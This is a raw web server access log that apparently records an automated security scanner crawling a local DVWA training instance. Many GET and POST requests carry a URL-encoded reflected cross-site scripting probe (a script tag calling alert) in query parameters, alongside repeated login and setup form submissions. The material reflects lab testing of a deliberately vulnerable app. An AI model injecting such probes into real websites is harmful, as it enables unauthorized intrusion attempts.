172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/images?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 301 644 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/images/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:19 +0000] "GET /dvwa/images/login_logo.png?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/images/logo.png?query=0W45pz4p HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/images/RandomStorm.png?query=0W45pz4p HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/images/logo.png?query=query0W45pz4p HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/images/RandomStorm.png?query=query0W45pz4p HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/images/logo.png?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/images/RandomStorm.png?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/js HTTP/1.1" 301 526 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/images/spanner.png?query=0W45pz4p HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/images/spanner.png?query=query0W45pz4p HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/js?query=0W45pz4p HTTP/1.1" 301 556 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/images/spanner.png?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/js/?query=0W45pz4p HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/js?query=query0W45pz4p HTTP/1.1" 301 566 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/js/?query=query0W45pz4p HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/js?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 301 636 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/js/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/js/add_event_listeners.js?query=0W45pz4p HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/js/add_event_listeners.js?query=query0W45pz4p HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/js/dvwaPage.js?query=0W45pz4p HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/js/add_event_listeners.js?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/js/dvwaPage.js?query=query0W45pz4p HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /dvwa/js/dvwaPage.js?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /favicon.ico?query=0W45pz4p HTTP/1.1" 200 1670 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /favicon.ico?query=query0W45pz4p HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /favicon.ico?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /instructions.php?query=0W45pz4p HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /instructions.php?query=query0W45pz4p HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /instructions.php?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /instructions.php?doc=0W45pz4p HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /instructions.php?doc=PHPIDS-license0W45pz4p HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /login.php?query=0W45pz4p HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /login.php?query=query0W45pz4p HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /instructions.php?doc=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:20 +0000] "GET /login.php?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /login.php?query=0W45pz4p HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /robots.txt?query=0W45pz4p HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /login.php?query=query0W45pz4p HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /robots.txt?query=query0W45pz4p HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /login.php?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /robots.txt?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /setup.php?query=0W45pz4p HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /setup.php?query=0W45pz4p HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /setup.php?query=query0W45pz4p HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /setup.php?query=query0W45pz4p HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /setup.php?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /setup.php HTTP/1.1" 200 4347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /setup.php?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /sitemap.xml?query=0W45pz4p HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /sitemap.xml?query=query0W45pz4p HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /sitemap.xml?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /docs HTTP/1.1" 301 520 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /?query=zApPX0sS HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /about.php?query=zApPX1sS HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /docs?query=zApPX2sS HTTP/1.1" 301 550 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /dvwa HTTP/1.1" 301 520 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /docs/DVWA_v1.3.pdf?query=zApPX3sS HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /dvwa?query=zApPX4sS HTTP/1.1" 301 550 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /dvwa/css?query=zApPX5sS HTTP/1.1" 301 558 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:21 +0000] "GET /dvwa/css/login.css?query=zApPX6sS HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:22 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:22 +0000] "GET /dvwa/css/main.css?query=zApPX7sS HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:22 +0000] "GET /dvwa/images?query=zApPX8sS HTTP/1.1" 301 564 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:22 +0000] "GET /dvwa/images/login_logo.png?query=zApPX9sS HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:22 +0000] "GET /dvwa/images/logo.png?query=zApPX10sS HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:22 +0000] "GET /dvwa/images/RandomStorm.png?query=zApPX11sS HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
